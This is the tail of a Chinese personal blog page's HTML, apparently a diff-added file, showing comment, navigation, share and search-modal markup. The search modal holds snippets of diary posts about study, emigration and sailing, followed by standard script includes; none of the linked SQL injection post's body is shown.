+              
+                <div id="disqus_thread"></div>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2024 <a href="https://duzhi5368.github.io">Frankie</a>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://fafo4games.com/2020/03/modsecurity%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%E6%9C%AA%E5%AE%8C%E7%BB%93/" data-tooltip="ModSecurity网络安全防御策略【未完结】">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://fafo4games.com/2020/02/%E6%9C%88%E8%AE%B0202002/" data-tooltip="月记202002">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://fafo4games.com/2020/03/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://duzhi5368.github.io/?=https%3A%2F%2Ffafo4games.com%2F2020%2F03%2Fsql%25E6%25B3%25A8%25E5%2585%25A5%25E6%2594%25BB%25E9%2598%25B2%25E6%259C%25AA%25E5%25AE%258C%25E7%25BB%2593%2F">
+          <i class="fa fa-home"></i><span>分享到 Homepage</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/04ac3b6c0ab5e7f256a7ed05871e69e5?s=110" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Frankie Wong</h4>
+    
+      <div id="about-card-bio">Ever tried, ever failed, fail better.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Full-time solo indie game developer
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Ecuador
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/09/%E6%9C%88%E8%AE%B0202409/">
+                <h3 class="media-heading">月记202409</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/08/%E6%9C%88%E8%AE%B0202408/">
+                <h3 class="media-heading">月记202408</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Aug 8, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/07/%E5%91%A8%E8%AE%B020240719_20240730/">
+                <h3 class="media-heading">周记20240719_20240730</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jul 7, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这半个月大致就是继续在调整方向，其根本原因还是去欧洲的计划给逼的。</p>
+
+<p>虽然在美洲躺平是可以的，但从被动收入的角度来说，有自己的事业并增加被动收入的本金也是应当去做的事情。而一旦要去欧洲，我依然要去做一些事情获取更多的收入，所以最近在调研这些事情。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/06/%E6%9C%88%E8%AE%B0202406/">
+                <h3 class="media-heading">月记202406</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jun 6, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>最近考察觉得，西班牙移民还是相当明智的；之后的计划可能要做一些调整了，要进一步远离国内的各种影响才行。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/05/%E5%8D%8A%E6%9C%88%E8%AE%B020240523-20240531/">
+                <h3 class="media-heading">半月记20240523-20240531</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>最近整理了一下计划，包括事业规划，资金方面计划，以及之后的生活计划。然后整理了一些最近的生活感受以及对独立游戏的想法。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/05/%E5%8D%8A%E6%9C%88%E8%AE%B020240508-20240522/">
+                <h3 class="media-heading">半月记20240508-20240522</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这半月语言学习进度很好，有了很好的学习习惯。但独立游戏没有开始进展，始终在思考和整理中。</p>
+
+<p>为避免多线作战，打算6月底之前就不进行独立游戏了，先把英日西三语学到一个阶段，然后该停止的停止，该减量的减量，然后全力投入独立游戏中。</p>
+
+<p>这半个月继续了解了一些被动收入和欧洲移民的信息，大致对被动收入这块的认知有一些进步，还是趁着年轻继续积累本金有意义，也就意味着可以去快乐的打工，而非一定要100%投入到被动收入和数字游牧，可以慢慢的向那个方向转变，现在全职被动收入，还是有些步子迈的大了一些。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2024/05/rya%E8%88%B9%E9%95%BF%E5%A4%8D%E4%B9%A0/">
+                <h3 class="media-heading">RYA船长复习</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>众所周知，我是一名爱画画的船长。所以接下来俺将一些自己RYA帆船航行课程整理一下，以便自己之后有机会进行进阶。为表达方便，会以两种方式呈现，部分以文字，部分以图示记录。大致内容为RYA(英国皇家游艇协会)体系的Competent Crew(合格水手) Day skipper(日间船长)，Coastal Skipper(近岸船长)，甚至包含了Yacht Master Ocean(远洋航海大师)的理论内容，以中英双语总结。那么废话不多说，开始总结记录。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2023/02/%E5%91%A8%E8%AE%B020230220-20230226/">
+                <h3 class="media-heading">周记20230220-20230226</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>本周学习进度还好，除最后两天休息，没有特殊的事情进行干扰，但也没有进入拼命努力的状态，我想是时候退出全部社交环境了。</p>
+
+<p>经过4个月，特别是最近2个月的状态调整，可以明显的感觉到语言有大幅度进步，Unity更是完整消化一遍，很有信心，虽然慢了一些，但吸收的的确非常稳，如果能一直如此就好了。</p>
+
+<p>尝试更多的投入其中吧，我只有这一年时间可以安心学习了。起码，要怀着这种心情去投入学习吧。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2023/02/%E5%91%A8%E8%AE%B020230213-20230219/">
+                <h3 class="media-heading">周记20230213-20230219</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这个星期本身除了偶尔晚上玩一些google play游戏之外，已经顺利的进入了学习状态，自我感觉良好，但单周统计结果并不如预期，所以做了一些调整。</p>
+
+<p>另外本周接触了一些AI做的COSER图，以及AI配音的视频。深深感觉逃避AI是不可能的了，只能去接受它，特别是在游戏开发等偏轻度创作领域，所以索性将其加入下半年学习列表中。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://fafo4games.com/2023/02/%E5%91%A8%E8%AE%B020230130-20230212/">
+                <h3 class="media-heading">周记20230130-20230212</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>本周和老婆商量了一下接下来的安排，虽然依然不能太相信她的话，不过衡量的天平还是更多向“不打工，纯靠数字游牧赚钱”这边又靠了一些。</p>
+
+<p>这也就意味着，Unreal的权重进一步降低了，而独立游戏，外包兼职的权重加重（美术被迫要考虑拿起来了），渗透黑客权重不变。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         299 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://fafo4games.com/images/cover.png');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js" integrity="sha256-IFHWFEbU2/+wNycDECKgjIRSirRNIDp2acEB5fvdVRU=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js" integrity="sha256-+mpyNVJsNt4rVXCw0F+pAOiB3YxmHgrbJsx4ecPuUaI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js" integrity="sha256-vMxgR/7FtLovVA+IPrR7+xTgIgARH7y9VZQnmmi0HDI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js" integrity="sha256-N0qFUh7/9vLvia87dDndewmsgsyYoNkdA212tPc+2NI=" crossorigin="anonymous"></script>
+
+
+<script src="https://fafo4games.com/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/fafo4games.com\/2020\/03\/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93\/';
+          
+            this.page.identifier = '\/2020\/03\/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'duzhi5368-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
